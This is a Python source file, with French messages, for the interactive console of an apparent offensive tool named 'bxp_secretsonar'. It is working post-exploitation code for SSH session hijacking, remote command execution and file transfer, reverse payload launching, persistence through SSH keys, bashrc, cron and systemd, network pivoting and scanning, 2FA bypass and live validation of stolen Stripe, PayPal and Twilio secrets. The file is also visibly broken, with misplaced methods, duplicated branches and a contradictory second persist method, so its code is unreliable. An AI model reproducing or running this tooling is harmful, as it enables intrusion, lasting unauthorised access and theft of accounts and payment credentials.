import asyncio
import os
import shlex
import sys
import threading
import select
import termios
import tty
from rich.console import Console
from bxp_secretsonar.core.environment import EnvironmentProfile
from bxp_secretsonar.core.models_v2 import Session
from bxp_secretsonar.exploit.framework import ExploitFramework

console = Console()

class InteractiveConsole:
    def __init__(self, framework: ExploitFramework):
        self.framework = framework
        self.env = EnvironmentProfile()
        self.current_session = None
        self.running = False

    async def start(self):
        self.running = True
        console.print("[bold cyan]🔌 Console post-exploitation interactive[/]")
        console.print("[dim]Tapez 'help' pour la liste des commandes.[/]")
        while self.running:
            try:
                sess_name = self.current_session.target if self.current_session else "exploit"
                cmd = input(f"{sess_name}> ").strip()
                if cmd:
                    await self.handle_command(cmd)
            except (EOFError, KeyboardInterrupt):
                self.running = False
                console.print("\n[bold red]Fermeture de la console.[/]")
            except Exception as e:
                console.print(f"[red]Erreur: {e}[/]")

    async def handle_command(self, cmd_line: str):
        parts = shlex.split(cmd_line)
        if not parts:
            return
        cmd = parts[0].lower()
        args = parts[1:]

        if cmd == "help":
            self.show_help()
        elif cmd == "sessions":
            self.list_sessions()
        elif cmd == "ssh_login":
            await self.ssh_login(args)
        elif cmd == "interact":
            await self.interact_session(args)
        elif cmd == "background":
            self.background_session()
        elif cmd == "exec":
            await self.exec_command(args)
        elif cmd == "upload":
            await self.upload_file(args)
        elif cmd == "download":
            await self.download_file(args)
        elif cmd == "shell":
            await self.spawn_local_shell()
        elif cmd == "generate":
            self.generate_payload(args)
        elif cmd == "bypass_2fa":
            await self.bypass_2fa_command(args)
        elif cmd == "pivot":
            await self.pivot_command(args)
        elif cmd == "persist":
            await self.persist_command(args)
        elif cmd == "deep_validate":
            await self.deep_validate_command(args)
        elif cmd == "bypass_2fa":
            await self.bypass_2fa_command(args)
        elif cmd == "pivot":
            await self.pivot_command(args)
        elif cmd == "persist":
            await self.persist_command(args)
        elif cmd == "kill":
            self.kill_session(args)
        elif cmd in ("exit", "quit"):
            self.running = False
        else:
            console.print(f"[yellow]Commande inconnue: {cmd}[/]")

    def show_help(self):
        console.print("""
[bold]Commandes disponibles:[/]
  sessions                               Lister les sessions actives
  ssh_login <host[:port]> <user> <pass> [--key <fichier>]  Créer une session SSH
  interact <id>                          Prendre le contrôle interactif d'une session
  background                             Mettre la session en arrière-plan
  exec <commande>                        Exécuter une commande sur la session courante
  upload <fichier_local> [distant]       Uploader un fichier via SFTP
  download <fichier_distant> [local]     Télécharger un fichier via SFTP
  shell                                  Ouvrir un shell local
  generate <payload> <lhost> <lport>     Générer et lancer un payload localement
  kill <id>                              Détruire une session
  help                                   Afficher cette aide
  exit                                   Quitter la console
""")

    def list_sessions(self):
        if not self.framework.sessions:
            console.print("[yellow]Aucune session active.[/]")
            return
        for i, s in enumerate(self.framework.sessions):
            status = "🟢" if s.alive else "🔴"
            console.print(f"  {i}: {status} {s.target} ({s.protocol}) - {s.access_level}")

    async def interact_session(self, args):
        if not args:
            console.print("[red]Usage: interact <id>[/]")
            return
        try:
            idx = int(args[0])
            session = self.framework.sessions[idx]
            if not session.alive:
                console.print("[red]Session morte[/]")
                return
            self.current_session = session
            console.print(f"[green]Connexion à {session.target}...[/]")
            if session.protocol == "ssh" and session.tunnel:
                self._interactive_ssh(session)
            else:
                console.print("[yellow]Cette session n'offre pas de shell interactif. Utilisez 'exec <cmd>'.[/]")
        except (IndexError, ValueError):
            console.print("[red]ID de session invalide[/]")

    def _interactive_ssh(self, session: Session):
        client = session.tunnel
        if not client:
            console.print("[red]Pas de client SSH attaché[/]")
            return
        try:
            chan = client.invoke_shell(term='xterm', width=80, height=24)
            chan.settimeout(0.0)
            console.print("[bold green]Shell SSH interactif démarré. Tapez ~. pour quitter.[/]")
            oldtty = termios.tcgetattr(sys.stdin)
            try:
                tty.setraw(sys.stdin.fileno())
                tty.setcbreak(sys.stdin.fileno())
                def reader():
                    try:
                        while not chan.closed:
                            if chan.recv_ready():
                                data = chan.recv(4096)
                                if not data:
                                    break
                                sys.stdout.write(data.decode('utf-8', errors='replace'))
                                sys.stdout.flush()
                    except Exception:
                        pass
                t = threading.Thread(target=reader, daemon=True)
                t.start()
                while not chan.closed:
                    if sys.stdin in select.select([sys.stdin], [], [], 0.1)[0]:
                        char = sys.stdin.read(1)
                        if char:
                            if char == '~':
                                next_char = sys.stdin.read(1)
                                if next_char == '.':
                                    break
                                else:
                                    chan.send(f"~{next_char}".encode())
                            else:
                                chan.send(char.encode())
            finally:
                termios.tcsetattr(sys.stdin, termios.TCSADRAIN, oldtty)
                chan.close()
            console.print("\n[dim]Retour à la console.[/]")
        except Exception as e:
            console.print(f"[red]Erreur shell interactif: {e}[/]")

    def background_session(self):
        if self.current_session:
            console.print(f"[yellow]Session {self.current_session.target} mise en arrière-plan[/]")
            self.current_session = None
        else:
            console.print("[yellow]Aucune session active[/]")

    async def exec_command(self, args):
        if not args:
            console.print("[red]Usage: exec <commande>[/]")
            return
        command = " ".join(args)
        sess = self.current_session
        if not sess or not sess.alive:
            console.print("[red]Aucune session active ou session morte[/]")
            return
        if sess.protocol == "ssh" and sess.tunnel:
            client = sess.tunnel
            try:
                stdin, stdout, stderr = client.exec_command(command, get_pty=True)
                out = stdout.read().decode().strip()
                err = stderr.read().decode().strip()
                if out:
                    console.print(out)
                if err:
                    console.print(f"[red]{err}[/]")
            except Exception as e:
                console.print(f"[red]Erreur d'exécution: {e}[/]")
        else:
            console.print("[yellow]Cette session ne supporte pas exec[/]")

    async def upload_file(self, args):
        if len(args) < 1:
            console.print("[red]Usage: upload <fichier_local> [chemin_distant][/]")
            return
        local_path = args[0]
        remote_path = args[1] if len(args) > 1 else os.path.basename(local_path)
        if not os.path.exists(local_path):
            console.print(f"[red]Fichier local introuvable: {local_path}[/]")
            return
        sess = self.current_session
        if not sess or not sess.alive or sess.protocol != "ssh" or not sess.tunnel:
            console.print("[red]Session SSH active requise pour l'upload[/]")
            return
        client = sess.tunnel
        try:
            sftp = client.open_sftp()
            sftp.put(local_path, remote_path)
            sftp.close()
            console.print(f"[green]Upload réussi: {local_path} -> {remote_path}[/]")
        except Exception as e:
            console.print(f"[red]Échec upload: {e}[/]")

    async def download_file(self, args):
        if len(args) < 1:
            console.print("[red]Usage: download <fichier_distant> [chemin_local][/]")
            return
        remote_path = args[0]
        local_path = args[1] if len(args) > 1 else os.path.basename(remote_path)
        sess = self.current_session
        if not sess or not sess.alive or sess.protocol != "ssh" or not sess.tunnel:
            console.print("[red]Session SSH active requise pour le download[/]")
            return
        client = sess.tunnel
        try:
            sftp = client.open_sftp()
            sftp.get(remote_path, local_path)
            sftp.close()
            console.print(f"[green]Téléchargement réussi: {remote_path} -> {local_path}[/]")
        except Exception as e:
            console.print(f"[red]Échec download: {e}[/]")

    async def spawn_local_shell(self):
        console.print("[yellow]Shell local (tapez 'exit' pour revenir)[/]")
        import subprocess
        subprocess.call(self.env.default_shell, shell=True)

    def generate_payload(self, args):
        if len(args) < 3:
            console.print("[red]Usage: generate <nom_payload> <lhost> <lport>[/]")
            return
        payload_name = args[0]
        lhost = args[1]
        lport = args[2]
        if payload_name in self.framework.payload_plugins:
            try:
                plugin = self.framework.payload_plugins[payload_name]()
                console.print(f"[green]Lancement du payload {payload_name} vers {lhost}:{lport}...[/]")
                def run_payload():
                    try:
                        plugin.run(lhost, lport)
                    except Exception as e:
                        console.print(f"[red]Erreur payload: {e}[/]")
                threading.Thread(target=run_payload, daemon=True).start()
            except Exception as e:
                console.print(f"[red]Erreur: {e}[/]")
        else:
            console.print(f"[red]Payload inconnu: {payload_name}[/]")

    async def ssh_login(self, args):
        """Créer une session SSH avec paramiko (ou fallback)."""
        if len(args) < 3:
            console.print("[red]Usage: ssh_login <host[:port]> <user> <password> [--key <fichier>][/]")
            return
        host_port = args[0]
        user = args[1]
        password = args[2]
        key_file = None
        if len(args) > 3 and args[3] == "--key":
            if len(args) < 5:
                console.print("[red]Usage: ... --key <fichier_cle>[/]")
                return
            key_file = args[4]
        port = 22
        if ":" in host_port:
            parts = host_port.split(":")
            host = parts[0]
            try:
                port = int(parts[1])
            except ValueError:
                console.print("[red]Port invalide[/]")
                return
        else:
            host = host_port

        try:
            import paramiko
        except ImportError:
            # Fallback système
            import shutil, subprocess
            if shutil.which("ssh"):
                console.print("[dim]paramiko absent, fallback vers commandes système...[/]")
                cmd = ["ssh", "-o", "StrictHostKeyChecking=no", "-p", str(port), f"{user}@{host}", "echo OK"]
                if key_file:
                    cmd = ["ssh", "-i", key_file, "-o", "StrictHostKeyChecking=no", "-p", str(port), f"{user}@{host}", "echo OK"]
                else:
                    if shutil.which("sshpass"):
                        cmd = ["sshpass", "-p", password, "ssh", "-o", "StrictHostKeyChecking=no", "-p", str(port), f"{user}@{host}", "echo OK"]
                    else:
                        console.print("[red]sshpass non installé, impossible d'utiliser le mot de passe en fallback. Installez paramiko ou sshpass.[/]")
                        return
                try:
                    res = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                    if res.returncode == 0:
                        console.print(f"[green]Fallback SSH réussi sur {host}:{port}[/]")
                        console.print("[yellow]Pas de session persistante (fallback).[/]")
                    else:
                        console.print(f"[red]Fallback échoué: {res.stderr.strip()}[/]")
                except Exception as e:
                    console.print(f"[red]Erreur fallback: {e}[/]")
            else:
                console.print("[red]Ni paramiko ni ssh ne sont disponibles. Impossible d'établir une connexion SSH.[/]")
            return

        # Connexion avec paramiko
        console.print(f"[dim]Connexion SSH (paramiko) à {host}:{port}...[/]")
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            connect_kwargs = {"hostname": host, "port": port, "username": user, "timeout": 10}
            if key_file:
                connect_kwargs["key_filename"] = key_file
            else:
                connect_kwargs["password"] = password
            client.connect(**connect_kwargs)
            session = Session(
                target=f"{host}:{port}",
                protocol="ssh",
                access_level="user",
                tunnel=client,
                alive=True
            )
            self.framework.sessions.append(session)
            console.print(f"[green]Session SSH #{len(self.framework.sessions)-1} ouverte sur {host}[/]")
            self.current_session = session
        except paramiko.AuthenticationException:
            console.print("[red]Échec d'authentification[/]")
        except paramiko.SSHException as e:
            console.print(f"[red]Erreur SSH: {e}[/]")
        except Exception as e:
            err = str(e).lower()
            if "timed out" in err:
                console.print("[red]Timeout - hôte injoignable[/]")
            elif "connection refused" in err:
                console.print("[red]Connexion refusée (port fermé ?)[/]")
            else:
                console.print(f"[red]Échec de connexion: {e}[/]")

    def kill_session(self, args):
        if not args:
            console.print("[red]Usage: kill <id>[/]")
            return
        try:
            idx = int(args[0])
            session = self.framework.sessions.pop(idx)
            if session.tunnel:
                try:
                    session.tunnel.close()
                except:
                    pass
            console.print(f"[green]Session {idx} détruite.[/]")
        except (IndexError, ValueError):
            console.print("[red]ID invalide[/]")


def launch_interactive_console(framework: ExploitFramework):
    console_instance = InteractiveConsole(framework)
    asyncio.run(console_instance.start())

    async def persist_command(self, args):
        if not args:
            console.print("[red]Usage: persist <méthode> [options][/]")
            console.print("Méthodes disponibles: ssh_key --pubkey <fichier>")
            return
        method = args[0]
        if method == "ssh_key":
            plugin = PersistSSHKey()
        elif method == "bashrc":
            plugin = PersistBashrc()
            if len(args) < 3 or args[1] != "--pubkey":
                console.print("[red]Usage: persist ssh_key --pubkey <fichier_cle_publique>[/]")
                return
            pubkey_file = args[2]
            sess = self.current_session
            if not sess or not sess.alive or sess.protocol != "ssh":
                console.print("[red]Session SSH active requise[/]")
                return
            # Charger le plugin de persistance
            from bxp_secretsonar.plugins.post_exploit.persist_ssh import PersistSSH
            plugin = PersistSSH()
            result = plugin.run(sess, {"pubkey": pubkey_file})
            if result["success"]:
                console.print("[green]Clé SSH ajoutée avec succès ![/]")
            else:
                console.print(f"[red]Échec: {result['output']}[/]")
        else:
            console.print(f"[red]Méthode de persistance inconnue: {method}[/]")

    async def deep_validate_command(self, args):
        """Validation approfondie d'un secret sur le service détecté."""
        if not args:
            console.print("[red]Usage: deep_validate <provider> [secret][/]")
            console.print("Providers supportés : stripe, paypal, twilio, github, ...")
            return
        provider = args[0].lower()
        secret = args[1] if len(args) > 1 else None

        # Récupérer le secret depuis la session courante ou la demande manuelle
        if not secret and self.current_session and self.current_session.evidence:
            secret = self.current_session.evidence.matched_value
        if not secret:
            console.print("[red]Aucun secret fourni. Spécifiez un secret ou utilisez une session active.[/]")
            return

        # Créer un objet Candidate minimal pour le validateur
        from bxp_secretsonar.core.models import Evidence, Candidate
        evidence = Evidence(
            artifact_id="manual",
            pattern_name=f"manual_{provider}_key",
            matched_value=secret,
            context_before="",
            context_after="",
            entropy_score=0.0
        )
        candidate = Candidate(evidence=evidence, confidence_score=0.5, priority=5)

        # Router vers le bon validateur
        validator = None
        if provider in ("stripe",):
            from bxp_secretsonar.validators.stripe_validator import StripeValidator
            validator = StripeValidator(ssl_verify=self.env.ssl_verify, timeout=5.0)
        elif provider in ("paypal",):
            from bxp_secretsonar.validators.paypal_validator import PayPalValidator
            validator = PayPalValidator(ssl_verify=self.env.ssl_verify, timeout=5.0)
        elif provider in ("twilio",):
            from bxp_secretsonar.validators.twilio_validator import TwilioValidator
            validator = TwilioValidator(ssl_verify=self.env.ssl_verify, timeout=5.0)
        # Ajouter d'autres providers si besoin

        if not validator:
            console.print(f"[red]Validateur pour '{provider}' non trouvé.[/]")
            return

        console.print(f"[dim]Validation approfondie de {provider}...[/]")
        validated = await validator.validate(candidate)
        if validated.is_confirmed:
            console.print(f"[green]✓ Secret valide (confiance: {validated.candidate.confidence_score:.2f})[/]")
            metadata = validated.candidate.evidence.metadata
            for k, v in metadata.items():
                console.print(f"  {k}: {v}")
        else:
            console.print(f"[red]✗ Secret invalide ou rejeté.[/]")

    async def persist_command(self, args):
        if not args:
            console.print("[red]Usage: persist <méthode> [options][/]")
            console.print("Méthodes disponibles:")
            console.print("  bashrc --command <commande>")
            console.print("  ssh_key --pubkey <fichier>")
            console.print("  cron --command <commande> [--schedule <cron_expr>]")
            console.print("  systemd --command <commande> [--name <nom_service>]")
            return

        method = args[0]
        options = {}
        # Parser les arguments --key value
        i = 1
        while i < len(args):
            if args[i].startswith('--'):
                key = args[i][2:]
                if i + 1 < len(args) and not args[i+1].startswith('--'):
                    options[key] = args[i+1]
                    i += 2
                else:
                    options[key] = True
                    i += 1
            else:
                i += 1

        sess = self.current_session
        if not sess or not sess.alive or sess.protocol != "ssh":
            console.print("[red]Session SSH active requise pour la persistance[/]")
            return

        from bxp_secretsonar.plugins.post_exploit.persist import PersistSSHKey, PersistCron, PersistSystemd, PersistBashrc

        if method == "ssh_key":
            plugin = PersistSSHKey()
        elif method == "bashrc":
            plugin = PersistBashrc()
            plugin = PersistSSHKey()
        elif method == "cron":
            plugin = PersistCron()
        elif method == "systemd":
            plugin = PersistSystemd()
        else:
            console.print(f"[red]Méthode de persistance inconnue: {method}[/]")
            return

        result = plugin.run(sess, options)
        if result["success"]:
            console.print("[green]Persistance appliquée avec succès ![/]")
        else:
            console.print(f"[red]Échec: {result.get('output', '')} {result.get('error', '')}[/]")

    async def pivot_command(self, args):
        if not args:
            console.print("[red]Usage: pivot <méthode> [options][/]")
            console.print("Méthodes disponibles:")
            console.print("  list")
            console.print("  stop all")
            console.print("  socks [--port <port_local>]")
            console.print("  scan --range <IP/mask> [--ports <ports>] [--jitter <secondes>]")
            console.print("  forward --local_port <LPORT> --remote_host <IP> --remote_port <RPORT> [--direction L|R]")
            return

        method = args[0]
        options = {}
        i = 1
        while i < len(args):
            if args[i].startswith('--'):
                key = args[i][2:]
                if i + 1 < len(args) and not args[i+1].startswith('--'):
                    options[key] = args[i+1]
                    i += 2
                else:
                    options[key] = True
                    i += 1
            else:
                i += 1

        from bxp_secretsonar.plugins.post_exploit.pivot import PivotSOCKS, PivotScan, PivotPortForward, list_tunnels, stop_all_tunnels

        if method == "list":
            console.print(list_tunnels())
            return
        elif method == "stop":
            if len(args) > 1 and args[1] == "all":
                console.print(stop_all_tunnels())
            else:
                console.print("[red]Usage: pivot stop all[/]")
            return
        elif method == "socks":
            plugin = PivotSOCKS()
        elif method == "scan":
            plugin = PivotScan()
        elif method == "forward":
            plugin = PivotPortForward()
        else:
            console.print(f"[red]Méthode inconnue: {method}[/]")
            return

        sess = self.current_session
        if not sess or not sess.alive or sess.protocol != "ssh":
            console.print("[red]Session SSH active requise pour le pivoting[/]")
            return

        result = plugin.run(sess, options)
        if result["success"]:
            console.print(f"[green]{result['output']}[/]")
        else:
            console.print(f"[red]Échec: {result.get('output', '')}[/]")
    async def bypass_2fa_command(self, args):
        if not args:
            console.print("[red]Usage: bypass_2fa <action> [options][/]")
            console.print("Actions: detect, replay, generate_token, extract_cookies, refresh_oauth, test_mobile_endpoints, start_long_trail, stop_long_trail, list_tokens")
            console.print("  bypass_2fa detect   (utilise la session courante)")
            console.print("  bypass_2fa replay")
            console.print("  bypass_2fa generate_token")
            return

        action = args[0]
        sess = self.current_session
        if not sess:
            console.print("[red]Aucune session active[/]")
            return

        # On utilise le secret stocké dans la session (si disponible)
        # Il faudrait que la console ait accès au Validated associé à la session
        # Pour simplifier, on passe la session au plugin et on lui laisse extraire le secret
        from bxp_secretsonar.plugins.post_exploit.bypass_2fa import Bypass2FA
        plugin = Bypass2FA()
        options = {"action": action}
        result = plugin.run(sess, options)
        if result.get("success"):
            console.print(f"[green]{result['output']}[/]")
        else:
            console.print(f"[red]{result.get('output', 'Échec')}[/]")
